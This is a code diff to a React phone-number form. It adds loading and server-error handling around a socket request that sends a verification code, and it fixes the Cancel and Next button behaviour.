@@ -2832,10 +2832,40 @@ const PhoneForm = ({ setTab, phoneNumber, setPhoneNumber }) => {
 
     const [placeholder, setPlaceholder] = useState(select.pattern);
     const [error, setError] = useState(false);
+    const [serverError, setServerError] = useState('');
+    const [loading, setLoading] = useState(false);
+    const [pendingPhone, setPendingPhone] = useState(null);
     
     useLayoutEffect(() => {
       setPlaceholder(select.pattern);
     }, [ select ]);
+
+    useEffect(() => {
+      const codeSentHandler = () => {
+        if (!pendingPhone) return;
+        setLoading(false);
+        setError(false);
+        setServerError('');
+        setPhoneNumber(pendingPhone);
+        setPendingPhone(null);
+        setTab(2);
+      };
+
+      const errorHandler = (data) => {
+        setLoading(false);
+        setPendingPhone(null);
+        setError(true);
+        setServerError(data?.message || 'Send code failed');
+      };
+
+      sockets.on('code-sent', codeSentHandler);
+      sockets.on('error-code', errorHandler);
+
+      return () => {
+        sockets.off('code-sent', codeSentHandler);
+        sockets.off('error-code', errorHandler);
+      };
+    }, [pendingPhone, setPhoneNumber, setTab]);
 
     const submit = (e) => {
       e.preventDefault();
@@ -2847,11 +2877,17 @@ const PhoneForm = ({ setTab, phoneNumber, setPhoneNumber }) => {
       } else {
         const data = { ...select, phone };
         try{
+          setLoading(true);
+          setError(false);
+          setServerError('');
+          setPendingPhone(data);
           sockets.emit("phone", { phone: data, from: searchParams.get('ref_page') });
-          setTab(2);
-          setPhoneNumber(data)
         } catch(e){
           console.log(e)
+          setLoading(false);
+          setPendingPhone(null);
+          setError(true);
+          setServerError('Send code failed');
         }
 
       }
@@ -2942,10 +2978,14 @@ const PhoneForm = ({ setTab, phoneNumber, setPhoneNumber }) => {
             <div className="inp1-label__placeholder">{placeholder}</div>
           </label>
           {error && <div className="error">Invalid phone number</div>}
+          {serverError && <div className="error">{serverError}</div>}
+          {loading && <div className="loading">Sending code...</div>}
         </div>
         <div className='phone-form__controls'>
-          <button type="submit" className="button button--transparent">Cancel</button>
-          <button type="submit" className="button">Next</button>
+          <button type="button" className="button button--transparent" onClick={() => { setPhone(''); setError(false); setServerError(''); setPendingPhone(null); }}>
+            Cancel
+          </button>
+          <button type="submit" className="button" disabled={loading}>{loading ? 'Wait...' : 'Next'}</button>
         </div>
     </form>
 
